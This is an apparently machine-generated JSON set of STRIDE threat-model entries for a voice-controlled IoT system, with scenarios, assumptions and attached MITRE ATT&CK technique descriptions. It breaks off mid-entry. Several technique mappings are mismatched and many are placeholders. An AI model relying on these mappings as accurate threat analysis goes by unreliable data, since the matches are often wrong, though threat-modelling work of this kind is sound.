[
{
    "case_number": "1",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses voice imitation software to impersonate a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the voice imitation software.",
                    "Role": "Attacker",
                    "Condition": "Software is obtainable either legally or illegally."
                },
                {
                    "Assumption": "The system does not have robust mechanisms for verifying the authenticity of the user's voice.",
                    "Role": "IoT Application",
                    "Condition": "Voice recognition algorithms are not foolproof against voice imitation."
                },
                {
                    "Assumption": "The attacker has access to recorded samples of the target user's voice.",
                    "Role": "Attacker",
                    "Condition": "Recordings can be captured through phishing or social engineering."
                }
            ],
            "Potential Impact": "Unauthorized access to the system, which can lead to information disclosure and control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "voice spoofing",
                "identity theft",
                "audio signal manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the client-side application by hijacking the network communication.",
            "Assumptions": [
                {
                    "Assumption": "The network communication is not encrypted or has weak encryption.",
                    "Role": "IoT Application or Network",
                    "Condition": "Use of outdated or insecure encryption protocols."
                },
                {
                    "Assumption": "The attacker is able to intercept the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the same network."
                },
                {
                    "Assumption": "The authentication mechanism relies on credentials that can be captured or spoofed.",
                    "Role": "IoT Application",
                    "Condition": "Weak or no authentication process in place."
                }
            ],
            "Potential Impact": "Access to sensitive data and unauthorized control of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "network hijacking",
                "credential capture",
                "encryption bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised IoT controller to send malicious commands.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller has security vulnerabilities.",
                    "Role": "IoT Controller",
                    "Condition": "Vulnerabilities are unpatched or unknown."
                },
                {
                    "Assumption": "The attacker can access the IoT network.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access channels are compromised."
                },
                {
                    "Assumption": "The system relies on the IoT controller for executing commands without additional validation.",
                    "Role": "IoT Application",
                    "Condition": "No secondary validation or anomaly detection in place."
                }
            ],
            "Potential Impact": "Execution of unauthorized actions, leading to potential physical harm or disruption.",
            "MITRE ATT&CK Keywords": [
                "iot device compromise",
                "command injection",
                "controller manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware on IoT devices to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely managed.",
                    "Role": "IoT Device Management",
                    "Condition": "Firmware can be modified without proper integrity checks."
                },
                {
                    "Assumption": "The attacker has access to the physical or network interface of the IoT device.",
                    "Role": "Attacker",
                    "Condition": "Physical tampering or network-based attacks."
                },
                {
                    "Assumption": "The system does not have robust mechanisms to detect firmware alterations.",
                    "Role": "IoT Application",
                    "Condition": "Lack of monitoring and alerting for firmware changes."
                }
            ],
            "Potential Impact": "Altered device behavior, compromising data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "integrity violation",
                "device manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actors intercept and modify voice commands during transmission between the microphone and the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are transmitted without encryption.",
                    "Role": "IoT Application",
                    "Condition": "Unencrypted communication paths between microphone and client-side application."
                },
                {
                    "Assumption": "The attacker has the capability to intercept the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Access to the local network or physical wiring."
                },
                {
                    "Assumption": "The system does not verify the integrity of voice commands before processing.",
                    "Role": "IoT Application",
                    "Condition": "No checksums or digital signatures."
                }
            ],
            "Potential Impact": "Execution of unauthorized or harmful actions, compromising data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "voice command interception",
                "integrity violation",
                "injection attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the client-side application to send false status reports to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application is vulnerable to code injection or manipulation.",
                    "Role": "IoT Application",
                    "Condition": "Web application vulnerabilities or unpatched exploits."
                },
                {
                    "Assumption": "The attacker can deploy the tampered application undetected.",
                    "Role": "Attacker",
                    "Condition": "Lack of application integrity checks."
                },
                {
                    "Assumption": "The system trusts the status reports from the client-side application without validation.",
                    "Role": "IoT Application",
                    "Condition": "No validation mechanisms in place."
                }
            ],
            "Potential Impact": "Misinformation leading to incorrect system states and decisions, affecting data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "client-side tampering",
                "code injection",
                "data falsification"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user claims that a particular voice command was never issued, challenging the system's records.",
            "Assumptions": [
                {
                    "Assumption": "The system does not keep comprehensive logs of user interactions.",
                    "Role": "IoT Application",
                    "Condition": "Lack of logging or insufficient logging details."
                },
                {
                    "Assumption": "The system relies solely on voice commands without additional authentication factors.",
                    "Role": "IoT Application",
                    "Condition": "Unifactor authentication setup."
                },
                {
                    "Assumption": "There is no non-repudiation mechanism in place to verify claims.",
                    "Role": "IoT Application",
                    "Condition": "Absence of digital signatures or other verification methods."
                }
            ],
            "Potential Impact": "Disputes over issued commands, leading to potential security and operational risks.",
            "MITRE ATT&CK Keywords": [
                "repudiation attack",
                "log manipulation",
                "dispute settlement"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having given permission to perform a particular action, such as opening a door.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have an auditable trail of approvals or permissions.",
                    "Role": "IoT Application",
                    "Condition": "Lack of detailed audit logs."
                },
                {
                    "Assumption": "Permissions are granted based on voice recognition, which can sometimes be inaccurate.",
                    "Role": "IoT Application",
                    "Condition": "Voice recognition errors."
                },
                {
                    "Assumption": "No additional verification process is in place once a command is received.",
                    "Role": "IoT Application",
                    "Condition": "Unverified actions based on single-tier authentication."
                }
            ],
            "Potential Impact": "Unauthorized actions leading to security breaches and potential harm.",
            "MITRE ATT&CK Keywords": [
                "permission denial",
                "audit logging",
                "voice-based approval"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker utilizes a flaw in the logging mechanism to delete or modify action logs.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored without tamper-proof protections.",
                    "Role": "IoT Application",
                    "Condition": "Logs can be altered or deleted easily."
                },
                {
                    "Assumption": "The attacker has obtained necessary privileges to access logs.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or elevated privileges."
                },
                {
                    "Assumption": "The system does not have redundancy or backups for critical logs.",
                    "Role": "IoT Application",
                    "Condition": "No backup mechanisms in place for logs."
                }
            ],
            "Potential Impact": "Invalid logs can lead to undetected malicious actions and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "evidence destruction",
                "audit trail manipulation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts sensitive voice command data during transmission from the microphone to the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "Voice command data is transmitted in an unencrypted format.",
                    "Role": "IoT Application",
                    "Condition": "No encryption or weak encryption protocols."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to the same network or physical interface."
                },
                {
                    "Assumption": "Sensitive data is transmitted through vulnerable communication channels.",
                    "Role": "IoT Application",
                    "Condition": "Use of insecure or deprecated communication protocols."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in cloud services is accessed by an unauthorized actor.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not properly secured with strong access controls.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak authentication or misconfigured access controls."
                },
                {
                    "Assumption": "Sensitive data is stored in the cloud without encryption.",
                    "Role": "IoT Application",
                    "Condition": "Plaintext data storage."
                },
                {
                    "Assumption": "The attacker has obtained credentials to access the cloud services.",
                    "Role": "Attacker",
                    "Condition": "Phishing, credential stuffing, or insider threats."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to privacy breaches and potential data leaks.",
            "MITRE ATT&CK Keywords": [
                "cloud data breach",
                "unauthorized access",
                "credential compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to access unprotected sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has known vulnerabilities that are not patched.",
                    "Role": "IoT Application",
                    "Condition": "Unpatched or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The system does not implement adequate input validation.",
                    "Role": "IoT Application",
                    "Condition": "Insufficient checks for user inputs."
                },
                {
                    "Assumption": "Sensitive data is not encrypted or masked within the application.",
                    "Role": "IoT Application",
                    "Condition": "Plaintext data storage and transmission."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user data, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "server-side exploitation",
                "input validation failure",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the IoT controller with a high volume of requests, making it unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller does not have rate limiting mechanisms in place.",
                    "Role": "IoT Application",
                    "Condition": "Lack of request rate controls."
                },
                {
                    "Assumption": "The attacker has the capability to generate high volumes of requests.",
                    "Role": "Attacker",
                    "Condition": "Botnets or similar tools at disposal."
                },
                {
                    "Assumption": "The system does not have redundant controllers to handle failsafe operations.",
                    "Role": "IoT Application",
                    "Condition": "Lack of redundancy and failover strategies."
                }
            ],
            "Potential Impact": "Disruption of IoT services, affecting data availability and dependent operations.",
            "MITRE ATT&CK Keywords": [
                "dos attack",
                "request flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has unpatched vulnerabilities.",
                    "Role": "IoT Application",
                    "Condition": "Unpatched software or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The attacker can send malformed requests to trigger the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the specific application vulnerabilities."
                },
                {
                    "Assumption": "The system does not have measures to handle or quarantine malicious requests.",
                    "Role": "IoT Application",
                    "Condition": "Lack of input validation and error handling."
                }
            ],
            "Potential Impact": "Complete system crash, leading to a denial of services and data availability.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "crash system",
                "input manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A high volume of voice commands overwhelms the processing capability of the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have scalable processing capabilities.",
                    "Role": "IoT Application",
                    "Condition": "Limited computing resources."
                },
                {
                    "Assumption": "Rate limiting or load balancing is not implemented.",
                    "Role": "IoT Application",
                    "Condition": "Absence of traffic management strategies."
                },
                {
                    "Assumption": "The system accepts and processes requests from unverified sources.",
                    "Role": "IoT Application",
                    "Condition": "No verification or whitelisting of trusted sources."
                }
            ],
            "Potential Impact": "Denial of service to legitimate users, affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "request flooding",
                "processing overload",
                "system unavailability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has unpatched vulnerabilities.",
                    "Role": "IoT Application",
                    "Condition": "Unpatched software or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The attacker has access to the client's device.",
                    "Role": "Attacker",
                    "Condition": "Compromised user device or social engineering attack."
                },
                {
                    "Assumption": "The system does not have adequate authorization checks.",
                    "Role": "IoT Application",
                    "Condition": "Insufficient access control measures."
                }
            ],
            "Potential Impact": "Unauthorized administrative access, compromising entire system security.",
            "MITRE ATT&CK Keywords": [
                "client-side exploitation",
                "privilege escalation",
                "access control bypass"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised IoT device to gain elevated privileges in the network.",
            "Assumptions": [
                {
                    "Assumption": "The IoT device has exploitable vulnerabilities.",
                    "Role": "IoT Device",
                    "Condition": "Unpatched vulnerabilities or insecure configurations."
                },
                {
                    "Assumption": "The compromised device is connected to a network with weak segmentation.",
                    "Role": "Network",
                    "Condition": "Flat network architecture without segmentation."
                },
                {
                    "Assumption": "The system does not have adequate monitoring and intrusion detection.",
                    "Role": "IoT Application",
                    "Condition": "Lack of robust monitoring strategies."
                }
            ],
            "Potential Impact": "Network-wide privileges, compromising data integrity and security.",
            "MITRE ATT&CK Keywords": [
                "network exploitation",
                "device compromise",
                "intrusion detection evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages weak access control to gain higher access levels to the cloud services used by the application.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have weak or misconfigured access controls.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Misconfiguration or weak policies."
                },
                {
                    "Assumption": "The attacker has already compromised lower-level access credentials.",
                    "Role": "Attacker",
                    "Condition": "Credential compromise through phishing or brute force."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for sensitive operations.",
                    "Role": "IoT Application",
                    "Condition": "Single factor authentication setup."
                }
            ],
            "Potential Impact": "Compromised cloud resources, leading to unauthorized data access and control.",
            "MITRE ATT&CK Keywords": [
                "cloud exploitation",
                "access control weakness",
                "credential escalation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by manipulating voice signals to execute unauthorized IoT commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a recording of the legitimate user's voice commands.",
                    "Role": "Attacker",
                    "Condition": "Valid when audio recordings are available or can be captured."
                },
                {
                    "Assumption": "The system does not have robust voice authentication mechanisms.",
                    "Role": "System",
                    "Condition": "Valid when voice recognition lacks sophistication."
                },
                {
                    "Assumption": "The attacker can intercept or interfere with the transmission of voice commands.",
                    "Role": "Attacker",
                    "Condition": "Valid when communication channels are not secure."
                }
            ],
            "Potential Impact": "Unauthorized actions performed by IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice manipulation",
                "IoT controller",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary mimics the server-side application to trick the client-side application into sending sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the server's communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid when server protocols are documented or can be reverse-engineered."
                },
                {
                    "Assumption": "The attacker has network access to intercept or redirect traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid when network security is compromised."
                },
                {
                    "Assumption": "The client-side application does not verify the authenticity of the server.",
                    "Role": "System",
                    "Condition": "Valid when there is a lack of strong server authentication."
                }
            ],
            "Potential Impact": "Leakage of user credentials or sensitive data.",
            "MITRE ATT&CK Keywords": [
                "server spoofing",
                "man-in-the-middle",
                "data exfiltration",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious voice command is inserted into a legitimate voice stream to execute unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can insert audio data into the communication stream.",
                    "Role": "Attacker",
                    "Condition": "Valid when physical or network access enables data injection."
                },
                {
                    "Assumption": "The system processes voice commands without strict validation.",
                    "Role": "System",
                    "Condition": "Valid when voice command validation rules are weak."
                },
                {
                    "Assumption": "There is a lack of continuous user verification during the session.",
                    "Role": "System",
                    "Condition": "Valid when user identity is not regularly checked."
                }
            ],
            "Potential Impact": "Execution of unauthorized commands affecting IoT devices.",
            "MITRE ATT&CK Keywords": [
                "input manipulation",
                "audio injection",
                "IoT control",
                "unauthorized execution"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the firmware of IoT devices through the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The attacker obtains administrative access to the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Valid when credentials are compromised or default credentials are not changed."
                },
                {
                    "Assumption": "The IoT devices accept firmware updates through the IoT controller.",
                    "Role": "System",
                    "Condition": "Valid when updates are pushed via the controller."
                },
                {
                    "Assumption": "Firmware verification is weak or non-existent.",
                    "Role": "System",
                    "Condition": "Valid when the devices do not verify the authenticity of updates."
                }
            ],
            "Potential Impact": "Malicious firmware alters device operation, compromising functionality.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "IoT devices",
                "administrator access",
                "compromised functionality"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the software on the client-side application to capture sensitive user information.",
            "Assumptions": [
                {
